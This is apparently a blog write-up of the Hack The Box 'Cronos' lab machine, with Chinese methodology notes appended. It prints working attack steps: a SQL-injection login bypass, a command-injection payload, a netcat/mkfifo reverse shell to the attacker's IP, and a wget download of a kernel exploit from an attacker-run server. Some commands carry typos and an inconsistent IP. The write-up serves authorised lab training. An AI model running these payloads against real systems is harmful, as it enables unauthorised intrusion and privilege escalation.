---
title: "Cronos -- hack the box"
author: Neal
summary: "本文围绕《Cronos -- hack the box》展开，重点梳理Introduction、Enumeration和Exploitation等内容，提炼背景、思路与实践注意点。"
cover: "/img/post-covers/cronos-hack-the-box-357884f03b.jpg"
tags: [安全, 渗透测试, HTB]
categories: [htb]
date: "2019-03-15"
lastmod: "2026-08-08"
---

![AEpKkq.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ad952f5d4c98.png)

## Introduction

Target machine: 10.10.10.13(OS: linux)

Kali linux: 10.10.16.44

## Enumeration

Firstly, detect the open ports:

```
nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
```

![AE1qlF.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/2b1609a58acc.png)

3 ports is open, detect the detailed services:

```
namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13
```

![AE1OOJ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/15fe51ea9188.png)

So we can conduct the relation of ports of ports and services as following:

port|service
---|---
53|DNS
22|ssh
80|http

## Exploitation

### http

As the target machine provides http service, try to access `http://10.10.10.13`

![AE3V0A.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d432e4592c5c.png)

Default apache web page, nothing new. So try to brute force `http://10.10.10.13/` with dirbuster. After brute force for a period time, we have not found anything new.

### DNS

As the target machine owns DNS service. It is common to check zone transfer with `dig`. As we can have a guess of the dns domain of `cronos.htb`. So zone transfer can be checked by:

```
dig axfr @10.10.10.13 cronos.htb
```

![AE3ZTI.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/826aa2aca8fb.png)

An interestring domain name `admin.cronos.htb` is found. So add an entry into `/etc/hosts`:

```
10.10.10.13    admin.cronos.htb
```

Try to access `admin.cronos.htb` in the browser, a login web page is displayed. Yep, it is what we want. It seems that the login is quite simple. Try to login with sql injection with the username of `admin ' or '1' = '1`, the password can be anything.

![AEpKkq.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ad952f5d4c98.png)

Magic! We are in. It seems that it is a network tool. However, it seems that it has exposed the ability to execute command remotely. Have a test of `8888&whoami`:

![AE1qlF.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/2b1609a58acc.png)

The result is `www-data`. Obviously, the command can executed properly. Now try to reverse the shell. Try to listen to port `1234` by nc in our kali:

```
nc -lvnp 1234
```

Then use the bash reverse shell command:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f
```

Wait for server second, shell is return. Wonderful!

![AE1OOJ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/15fe51ea9188.png)

Try to obtain a tty terminal:

```
python -c "import pty;pty.spawn('/bin/sh')"
```

Obviously, the user role can be obtained. Go the `home` folder and `ls`， then go into the user folder to get user.txt.

## Privilege escalation

It's time to get the root role. See the kernel of the target machine:

```
uname -a
```

Google linux kernel privilege escalation, find a [payload](https://www.exploit-db.com/exploits/44298)

![AE3V0A.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d432e4592c5c.png)

Server a http server to provide the payload, name it as exploit.c:

```
pythoon -m SimpleHTTPServer 80
```

There are serveal ways to provide http file services, including: php, apache, python, etc. Pyhton is quite convinient. Then download the `exploit.c` in the target machine:

```
wget http://10.10.16.22/exploit.c
```

Then try to compile it with gcc. Opps, gcc seems has not been installed in the target machine. In general, linux will install gcc. Whatever, compile the `exploit.c` in kali:

```
gcc exploit.c -o exploit
```

Remember to download the file from a folder with permission, just like `/tmp`:

```
cd /tmp
wget http://10.10.16.44/exploit
```

Make sure to have execution perssion by:

```
chmod +x exploit
```

Just execute it by `./exploit`. Wow, now see whoami.

![AE3ZTI.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/826aa2aca8fb.png)

## Conclusion

The target machine is quite straitforward. The basic point is the zone transfer of DNS exploit. And other steps is not difficult with basic knowledges including: sql injection, reverse shell, etc.


## Writeup 方法沉淀（授权靶场）

Cronos 类机器的通用路径仍是：

1. **全端口扫描** + 服务版本识别  
2. Web 虚拟主机 / 子域枚举（hosts 文件、DNS）  
3. 已知 CMS/框架漏洞或命令注入点  
4. 稳定反弹 shell 后做本机枚举  
5. 定时任务 / 内核 / sudo 提权  

写 writeup 时请固定结构：**信息收集 → 初始访问 → 提权 → 收获标志**，并标注仅在 Hack The Box 等授权环境练习。

## 外链图说明

文中部分截图托管在第三方图床，可能失效。关键命令与思路以文字与代码块为准；复现时以你当时 nmap/gobuster 输出为准。

## 小结

靶机价值在于训练完整攻击链，而不是背一个 IP。把枚举清单化，比死记某题的洞更重要。


## 时间盒练习法

给自己 2 小时：前 40 分钟只做枚举不利用，中 50 分钟打点，后 30 分钟提权与记录。超时就看官方/社区 writeup 对照差距。刻意练习比无限制熬夜刷机更提升能力。


## 延伸阅读与实践

把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。

若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。

对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。
